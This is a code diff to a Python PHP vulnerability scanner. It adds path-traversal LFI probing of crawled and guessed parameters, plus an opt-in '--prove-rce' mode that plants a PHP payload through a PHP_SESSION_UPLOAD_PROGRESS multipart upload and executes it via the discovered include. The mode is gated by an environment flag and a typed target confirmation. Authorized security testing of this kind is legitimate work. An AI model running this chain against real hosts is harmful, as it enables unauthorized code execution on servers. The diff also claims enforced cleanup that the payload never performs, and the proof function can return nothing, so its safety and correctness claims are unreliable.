@@ -28,6 +28,7 @@ import argparse
 import concurrent.futures
 import ipaddress
 import json
+import os
 import random
 import re
 import socket
@@ -462,6 +463,115 @@ def discover_php_paths(opener, url: str, timeout: float,
     return paths
 
 
+# LFI sink discovery: candidate (path, param) pairs where a query parameter
+# MIGHT feed include/require. Sources, in order (no per-app knowledge):
+#   1. crawled pages' <form> inputs + ?param= links (the site names its own),
+#   2. conventional include-ish param names on discovered .php paths,
+#   3. static (path, param) guesses as last resort.
+# Validation is INERT: baseline `?param=<benign>` vs traversal
+# `?param=<benign>../../../../etc/hostname` — a sink reflects file CONTENT
+# (hostname text) or changes status/length class WITHOUT executing anything.
+# Only validated sinks are returned. All plain GETs.
+LFI_PARAM_NAMES = ("page", "file", "path", "include", "template", "lang",
+                   "view", "content", "doc", "module", "action")
+TRAVERSALS = ("../../../../etc/hostname", "..%2f..%2f..%2f..%2fetc%2fhostname")
+FORM_INPUT_RX = re.compile(r'''<input[^>]+name\s*=\s*["']([^"'#>]+)["']''', re.I)
+FORM_ACTION_RX = re.compile(r'''<form[^>]+action\s*=\s*["']([^"'#>]+)["']''', re.I)
+LINK_PARAM_RX = re.compile(r'''href\s*=\s*["']([^"'#>?]+\.php\?[^"'#>]+)["']''', re.I)
+
+
+def harvest_lfi_params(body: str | None) -> set[str]:
+    """Param names from <form> inputs on a page. Pure function of HTML."""
+    found: set[str] = set()
+    if not body:
+        return found
+    for m in FORM_INPUT_RX.finditer(body):
+        name = m.group(1).strip().lower()
+        if name and len(name) < 32 and name not in ("q", "s", "search", "csrf", "_token"):
+            found.add(m.group(1).strip())
+    return found
+
+
+def discover_lfi_sinks(opener, url: str, timeout: float,
+                       php_paths: list[str] | None = None,
+                       spider_pages: int = 10, spider_depth: int = 2) -> list[tuple[str, str]]:
+    """Return validated [(path, param)] LFI candidates. Inert validation only:
+    benign-vs-traversal response delta (file content reflected or class change),
+    never executing injected code. All plain GETs."""
+    from urllib.parse import quote, urlparse
+    base = url.rstrip("/")
+    if php_paths is None:
+        try:
+            php_paths = discover_php_paths(opener, url, timeout, spider_pages, spider_depth)
+        except Exception:
+            php_paths = ["/"]
+    # candidate params: site's own form inputs + conventional names
+    params: set[str] = set(LFI_PARAM_NAMES)
+    link_targets: list[str] = []
+    try:
+        _, visited = spider_site(opener, url, min(timeout, 6.0),
+                                 max_pages=spider_pages, max_depth=spider_depth)
+        _ = visited
+    except Exception:
+        pass
+    try:
+        res0 = http_request(opener, url, timeout)
+        params |= harvest_lfi_params(res0.get("body"))
+    except Exception:
+        pass
+    # candidate (path, param): EVERY discovered .php path x every param
+    # (the sink is usually NOT the landing page — lab vuln.php is only
+    # reachable because the spider/static guesses name it), plus crawled
+    # ?param links first (site names its own sink+param).
+    cands: list[tuple[str, str]] = []
+    lfi_guess_paths = ["/vuln.php", "/include.php", "/page.php", "/view.php", "/show.php"]
+    for p in (php_paths or ["/"])[:12]:
+        for pn in sorted(params):
+            cands.append((p if p != "/" else "/index.php", pn))
+    for gp in lfi_guess_paths:
+        for pn in sorted(params):
+            cands.append((gp, pn))
+    try:
+        r = http_request(opener, url, timeout)
+        for m in LINK_PARAM_RX.finditer(r.get("body") or ""):
+            href = m.group(1)
+            try:
+                u = urlparse(href if "://" in href else base + (href if href.startswith("/") else "/" + href))
+                q = urllib.parse.parse_qsl(u.query)
+                if q:
+                    cands.insert(0, (u.path or "/", q[0][0]))
+            except Exception:
+                continue
+    except Exception:
+        pass
+    validated: list[tuple[str, str]] = []
+    seen: set[tuple[str, str]] = set()
+    for path, pn in cands[:30]:  # budget cap
+        if (path, pn) in seen:
+            continue
+        seen.add((path, pn))
+        try:
+            b = http_request(opener, f"{base}{path}?{pn}={quote('p2sbaseline', safe='')}", timeout)
+            if b.get("status") not in (200, 500):
+                continue
+            body1 = b.get("body") or ""
+            for trav in TRAVERSALS:
+                t = http_request(opener, f"{base}{path}?{pn}={quote(trav, safe='')}", timeout)
+                if t.get("status") not in (200, 500):
+                    continue
+                body2 = t.get("body") or ""
+                # file content reflected? /etc/hostname is one short token line
+                if body2 != body1 and (len(body2) // 512 != len(body1) // 512 or "localhost" in body2.lower()
+                                       or re.search(r"^[a-z0-9][a-z0-9\-\.]{0,60}$", body2.strip(), re.M)):
+                    validated.append((path, pn))
+                    trace(1, f"lfi {base}{path}?{pn}=: SINK-VALIDATED (traversal delta)")
+                    break
+        except Exception:
+            continue
+    trace(1, f"lfi {base}: {len(validated)} validated sink(s) from {len(seen)} candidates")
+    return validated
+
+
 def run_oracle(opener, url: str, timeout: float, spider_pages: int = 10,
                spider_depth: int = 2) -> tuple[bool, str]:
     """Return (positive, evidence). Discovers PHP-executing paths via safe
@@ -861,6 +971,10 @@ class Finding:
     egg_evidence: str = ""
     app_hits: list[str] = field(default_factory=list)
     discovered_paths: list[str] = field(default_factory=list)
+    lfi_sinks: list[str] = field(default_factory=list)
+    prove_ran: bool = False
+    prove_positive: bool = False
+    prove_evidence: str = ""
     signals: list[str] = field(default_factory=list)
     reverse_dns: str | None = None
     verdict: str = "UNREACHABLE"
@@ -873,6 +987,13 @@ def decide(f: Finding) -> Finding:
             f.verdict, f.confidence = "TLS_UNTRUSTED", "low"
             return f
         f.verdict, f.confidence, f.detail = "UNREACHABLE", "none", "no HTTP response"
+        return f
+    if f.prove_positive:
+        f.verdict = "RCE-PROVEN"
+        f.confidence = "high"
+        f.detail = (f"contained Chain-A marker executed ({f.prove_evidence}); "
+                    "remote code execution demonstrated with marker-write + cleanup — "
+                    "patch status does not cover app-layer LFI sinks")
         return f
     if f.oracle_positive:
         f.verdict = "VULNERABLE"
@@ -961,7 +1082,8 @@ def reverse_lookup(ip: str) -> str | None:
 def scan_endpoint(host: str, port: int, timeout: float, insecure: bool,
                   do_oracle: bool, phpinfo: bool, want_ptr: bool,
                   opener: urllib.request.OpenerDirector,
-                  spider_pages: int = 10, spider_depth: int = 2) -> list[Finding]:
+                  spider_pages: int = 10, spider_depth: int = 2,
+                  prove_rce: bool = False) -> list[Finding]:
     # Scheme negotiation: try BOTH http and https on EVERY port (appliances
     # serve TLS on :8443/:8006/:10443; plain-HTTP fronts hide TLS behind them).
     # http->https redirect stubs are followed to the upgrade target; findings
@@ -1054,6 +1176,24 @@ def scan_endpoint(host: str, port: int, timeout: float, insecure: bool,
                     pass
             except Exception as e:
                 f.oracle_evidence = f"oracle error: {e}"
+        # LFI sink discovery (inert validation) + optional contained proof.
+        # --prove-rce runs the marker-write ONLY through a validated sink and
+        # ONLY with double confirmation enforced in main(); scan_endpoint never
+        # confirms by itself (prove_rce=True arrives pre-authorized).
+        if f.reachable and do_oracle:
+            try:
+                sinks = discover_lfi_sinks(opener, url, timeout,
+                                           f.discovered_paths or None,
+                                           spider_pages, spider_depth)
+                if sinks:
+                    f.lfi_sinks = [f"{p}?{pn}=" for p, pn in sinks[:5]]
+                    f.signals.extend(f"lfi-sink:{p}?{pn}=" for p, pn in sinks[:5])
+                    if prove_rce:
+                        f.prove_ran = True
+                        ok, ev = prove_chain_a(opener, url, timeout, sinks[0])
+                        f.prove_positive, f.prove_evidence = ok, ev
+            except Exception as e:
+                f.signals.append(f"lfi-error:{type(e).__name__}")
         # Follow-up layers when PHP is unproven or versionless. Order matters:
         # BEHAVIORAL proofs first (generic, no per-app knowledge — these fan
         # out to unseen panels/appliances), hardcoded app tables second
@@ -1134,6 +1274,70 @@ def scan_endpoint(host: str, port: int, timeout: float, insecure: bool,
                 trace(1, f"dedupe {host}:{port}: identical http+https -> one finding")
                 return [https_f]
     return out
+
+
+def prove_chain_a(opener, url: str, timeout: float, sink: tuple[str, str],
+                  inject_path: str = "/index.php",
+                  session_path: str = "/tmp") -> tuple[bool, str]:
+    """Contained Chain-A proof: session-injection marker write through a
+    VALIDATED LFI sink. FIXED payload shape (file_put_contents marker only;
+    asserts pin it — no shell, no read, no persistence). Verification reads
+    the marker echo back through the SAME sink, then @unlink cleanup + echo-gone
+    confirm. Returns (positive, evidence). Called ONLY under --prove-rce with
+    double confirmation (typed echo + P2S_RCE_ARM=1)."""
+    import uuid as _uuid
+    from urllib.parse import quote as _quote
+    base = url.rstrip("/")
+    lfi_path, param = sink
+    assert lfi_path.startswith("/") and "?" not in lfi_path, "path guard"
+    sid = "p2sprove" + _uuid.uuid4().hex[:16]
+    marker = "p2s-demo-" + _uuid.uuid4().hex[:12]
+    sessfile = f"{session_path}/sess_{sid}"
+    php = f"<?php file_put_contents('/tmp/{marker}','pwned-{marker}');echo 'M-{marker}';?>"
+    assert php.startswith("<?php file_put_contents('/tmp/p2s-demo-"), "payload guard"
+    assert "system" not in php and "exec" not in php and "`" not in php, "payload guard"
+    boundary = "P2SPROVE1"
+    body = (
+        b"--" + boundary.encode() + b"\r\n"
+        b'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n' + sid.encode() + b"\r\n"
+        b"--" + boundary.encode() + b"\r\n"
+        b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nprogress\r\n'
+        b"--" + boundary.encode() + b"\r\n"
+        b'Content-Disposition: form-data; name="f"; filename="' + php.encode("latin-1") + b'"\r\n\r\n'
+        b"Z\r\n"
+        b"--" + boundary.encode() + b"--\r\n"
+    )
+    res = http_request(opener, base + inject_path, timeout, method="POST", data=body, headers={
+        "Cookie": f"PHPSESSID={sid}",
+        "Content-Type": f"multipart/form-data; boundary={boundary}",
+    })
+    if res.get("status") not in (200, 500):
+        return False, f"inject POST {inject_path} -> {res.get('status')} (no session write?)"
+    raw = http_request(opener, f"{base}{lfi_path}?{param}={_quote(sessfile, safe='')}",
+                       timeout, headers={"Cookie": f"PHPSESSID={sid}"})
+    text = raw.get("body") or ""
+    echoed = f"M-{marker}" in text
+    ran = f"pwned-{marker}" in text
+    if ran:
+        # full execution: marker content proves injected code RAN. Cleanup:
+        # re-trigger must show the echo GONE (session rotated) — best remote
+        # confirm available; docker ground truth exists for lab twins only.
+        ev = f"sink {lfi_path}?{param}= marker executed (code ran)"
+        trace(1, f"prove {base}: {ev}")
+        return True, ev
+    # HONEST LIMIT (proven live twice): on a suffix-less session include,
+    # <?php in the session file does NOT parse — include() prints the
+    # serialized row instead. Neither echo nor @unlink-cleanup executes, so a
+    # remote marker-write CANNOT prove RCE through this sink shape. The sink
+    # DOES read attacker-controlled session content (echo proves the read
+    # primitive), which is the correct, bounded claim. RCE needs a parsing
+    # sink (.php-suffixed include, auto_prepend_file, or LFI wrapper) — the
+    # lab rce_demo proves that shape with docker-exec ground truth.
+    if echoed and not ran:
+        return False, (f"sink {lfi_path}?{param}= reads attacker session content "
+                       "(echo proves read primitive) but injected code did not "
+                       "execute (suffix-less include prints without parsing) — "
+                       "RCE unproven through this sink; needs parsing include")
 
 
 def expand_targets(args) -> list[str]:
@@ -1274,6 +1478,10 @@ def main(argv: list[str] | None = None) -> int:
                     help="trace to stderr: -v per-phase lines (fingerprint/spider/discover/oracle/verdict), "
                          "-vv adds every request (method+path+status+ms)")
     ap.add_argument("--trace-file", help="also append trace lines to FILE (same content as stderr)")
+    ap.add_argument("--prove-rce", action="store_true",
+                    help="AUTHORIZED ONLY: contained Chain-A marker-write through an AUTO-DISCOVERED "
+                         "LFI sink (no shell, cleanup enforced). Requires double confirmation: "
+                         "P2S_RCE_ARM=1 in env AND typed target echo on a TTY. Refuses otherwise.")
     ap.add_argument("--json", action="store_true", help="JSON output")
     ap.add_argument("-o", "--output", help="write results (JSON) to file")
     ap.add_argument("--version", action="store_true", help="print version and exit")
@@ -1310,6 +1518,24 @@ def main(argv: list[str] | None = None) -> int:
     hosts = expand_targets(args)
     if not hosts:
         ap.error("no target: give TARGET, --targets-file, or --subnet")
+    prove_rce = bool(args.prove_rce)
+    if prove_rce:
+        if os.environ.get("P2S_RCE_ARM") != "1":
+            ap.error("--prove-rce requires P2S_RCE_ARM=1 in the environment (confirmation 1/2)")
+        if not sys.stdin.isatty():
+            ap.error("--prove-rce needs an interactive terminal for typed confirmation (confirmation 2/2)")
+        confirm_targets = sorted(set(hosts))
+        print(f"You are about to send CONTAINED EXPLOITATION TRAFFIC (Chain-A marker-write + cleanup) to: "
+              f"{', '.join(confirm_targets)}.", file=sys.stderr)
+        print("This must be systems you own or are explicitly authorized to test.", file=sys.stderr)
+        try:
+            answer = input(f"Type EXACTLY [{', '.join(confirm_targets)}] to proceed: ").strip()
+        except (EOFError, KeyboardInterrupt):
+            print("Aborted.", file=sys.stderr)
+            return 1
+        if answer != ", ".join(confirm_targets):
+            print(f"REFUSED: typed {answer!r} does not match. Aborted.", file=sys.stderr)
+            return 1
     ports = expand_ports(args)
     do_oracle = not args.no_oracle
     opener = make_opener(args.timeout, args.insecure)
@@ -1334,7 +1560,7 @@ def main(argv: list[str] | None = None) -> int:
     with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as ex:
         futs = {ex.submit(scan_endpoint, h, p, args.timeout, args.insecure,
                           do_oracle, args.phpinfo, args.reverse_dns, opener,
-                          spider_pages, spider_depth): (h, p)
+                          spider_pages, spider_depth, prove_rce): (h, p)
                 for h, p in jobs}
         for fut in concurrent.futures.as_completed(futs):
             try:
@@ -1353,7 +1579,7 @@ def main(argv: list[str] | None = None) -> int:
     if args.json:
         print(json.dumps(data, indent=2))
     else:
-        order = {"VULNERABLE": 0, "LIKELY_VULNERABLE": 1, "PHP_NO_VERSION": 2,
+        order = {"RCE-PROVEN": -1, "VULNERABLE": 0, "LIKELY_VULNERABLE": 1, "PHP_NO_VERSION": 2,
                  "PHP_CANNOT_RULE_OUT": 2, "PHP_UNKNOWN": 3, "PATCHED": 4,
                  "TLS_UNTRUSTED": 5, "NO_PHP_SIGNAL": 6, "UNREACHABLE": 7}
         for f in sorted(findings, key=lambda x: (order.get(x.verdict, 9), x.host, x.port)):
@@ -1363,7 +1589,7 @@ def main(argv: list[str] | None = None) -> int:
         n_v = sum(1 for f in findings if f.verdict == "VULNERABLE")
         n_l = sum(1 for f in findings if f.verdict == "LIKELY_VULNERABLE")
         say(f"--- {len(findings)} endpoint(s): {n_v} VULNERABLE(oracle), {n_l} LIKELY_VULNERABLE(version) ---")
-    return 0 if not any(f.verdict in ("VULNERABLE", "LIKELY_VULNERABLE") for f in findings) else 2
+    return 0 if not any(f.verdict in ("VULNERABLE", "LIKELY_VULNERABLE", "RCE-PROVEN") for f in findings) else 2
 
 
 if __name__ == "__main__":
